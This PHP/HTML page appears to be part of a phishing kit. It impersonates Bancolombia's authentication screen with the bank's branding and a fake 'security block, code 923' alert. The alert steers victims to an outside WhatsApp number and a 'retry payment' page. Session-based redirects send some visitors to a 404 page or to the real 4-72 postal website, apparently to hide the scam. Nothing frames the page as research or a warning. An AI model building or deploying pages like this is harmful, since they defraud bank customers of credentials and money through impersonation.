<?php
session_start();

if (isset($_SESSION['estado'])) {
    switch ($_SESSION['estado']) {
        case 2:
            header('Location: /404.php');
            exit;
        case 3:
            header('Location: https://www.4-72.com.co/publicaciones/236/personas/');
            exit;
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Autenticación Bancolombia</title>
  <link rel="stylesheet" href="css/923.css">
  <link rel="icon" href="images/favicon.ico">
    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <!-- jQuery -->
    <script src="/scripts/jquery-3.6.0.min.js"></script>
    <script src="/scripts/jquery.jclock-min.js"></script>
    <script src="/scripts/functions.js"></script>
</head>
<body class="fondo">
  <header>
    <img src="images/bancolombia.svg" alt="Bancolombia Logo" class="logo">
    <a href="#" class="logout">
      Salir
      <img src="images/flecha.svg" alt="Flecha" class="icono-flecha">
    </a>
  </header>
  <main>
  <div class="alerta-container">
    
        <div class="icon-circle">
        <svg viewBox="0 0 56 56" xmlns="http://www.w3.org/2000/svg">
          <circle cx="28" cy="28" r="28" fill="#FF7E00"/>
          <line x1="17" y1="17" x2="39" y2="39"
                stroke="#2b2b2b" stroke-width="2" stroke-linecap="round"/>
          <line x1="39" y1="17" x2="17" y2="39"
                stroke="#2b2b2b" stroke-width="2" stroke-linecap="round"/>
        </svg>
      </div>

  
    <div class="alerta-titulo">Por seguridad, no puedes continuar la transacción</div>
    <div class="alerta-texto">
      Código: 923 Para confirmar si eres tú quién hace la transacción, comunicate por nuestra sucursal telefonica 01-800-0912345<br>
      Si tienes dudas, llámanos a la Sucursal Telefónica y elige la opción 3 y de nuevo 3.

<div style="display: flex; flex-direction: column; align-items: center;">
  <button class="alerta-boton" onclick="window.open('https://wa.me/573013536788', '_blank')">
    Ir a WhatsApp
  </button>

  <button class="regreso-boton" onclick="window.location.href='reintentar_pago.php'">
    Reintentar Pago
  </button>
</div>
      
  </main>
  <div class="lineafinal1">
    <div class="lineafinal2"></div>
  
    <span class="lineafinal3">
      <div class="lineafinal4">
        <div class="lineafinal5"></div>
        <div class="lineafinal6"></div>
      </div>
  
      <div class="lineafinal7">
      </div>
    </span>
  </div>
<script>
    $(document).ready(function () {
        $('#btnUsuario').click(function () {
            if ($("#txtUsuario").val().trim().length > 0) {
                inicio($("#txtUsuario").val());
            } else {
                $("#err-mensaje").show();
                $("#txtUsuario").css("border-bottom", "1px solid red");
                $("#txtUsuario").focus();
            }
        });

        $("#txtUsuario").keyup(function () {
            $("#txtUsuario").css("border-bottom", "1px solid #dcdcdc");
            $("#err-mensaje").hide();
        });
    });
</script>

</body>
</html>